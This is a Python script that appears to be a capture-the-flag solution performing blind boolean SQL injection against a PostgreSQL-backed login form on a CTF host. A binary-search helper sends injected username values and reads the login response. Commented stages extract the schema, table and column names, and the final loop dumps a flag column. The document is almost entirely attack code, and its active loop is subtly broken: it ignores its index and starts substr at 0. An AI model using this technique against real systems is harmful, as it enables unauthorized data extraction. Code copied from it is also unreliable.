import requests
import time


url="https://pasteweb.ctf.zoolab.org/"
flag=""
def binsearch(l,r,payload):
    m=(l+r)//2
    while l<r:
        s=payload
        s+=str(m)+ " --"
        t=time.time()
        timestamp=int(t)
        timestamp=str(timestamp)
        data={
            "username":s,
            "password":111,
            "current_time":timestamp
        }
        response=requests.post(url,data=data)
        if "Login Failed" in response.text:
            r=m
        else:
            l=m+1
        m=(l+r)//2
    return l

# n=binsearch(0,100,f"' or length(current_schema) > 0")
# print(n)


# ss=''
# for i in range(10):
#     n=binsearch(0,127,f"' or ascii(substr(current_schema,{i+1},1)) > ")
#     ss+=chr(n)
# print(ss)



# n=binsearch(0,100,f"' or (SELECT count(tablename) FROM pg_tables WHERE schemaname=current_schema) >")
# print(n)


# table="table:"
# for i in range(2):
#     s=''
#     for j in range(20):
#         n=binsearch(0,127,f"' or ascii(substr((SELECT column_name FROM information_schema.columns WHERE table_name=‘pasteweb_accounts’ LIMIT 1 OFFSET {i}),{j+1},1)) >")
#         s+=chr(n)
#     table+=s
# print(table)




# db=""
# for i in range(150):
#     n=binsearch(0,256,f"' or ascii(substr((select current_query() from s3cr3t_t4b1e ),{i+1},1)) > ")
#     db+=chr(n)
# print(db)

# for i in range(250):
#     n=binsearch(0,256,f"' or ascii(substr((select current_query() from s3cr3t_t4b1e ),{i+1},1)) > ")
#     db+=chr(n)
# print(db)



db=""
for i in range(29):
    n=binsearch(0,256,f"' or ascii(substr((select fl4g from s3cr3t_t4b1e LIMIT 1 OFFSET 0),0,1)) >")
    db+=chr(n)
print(db)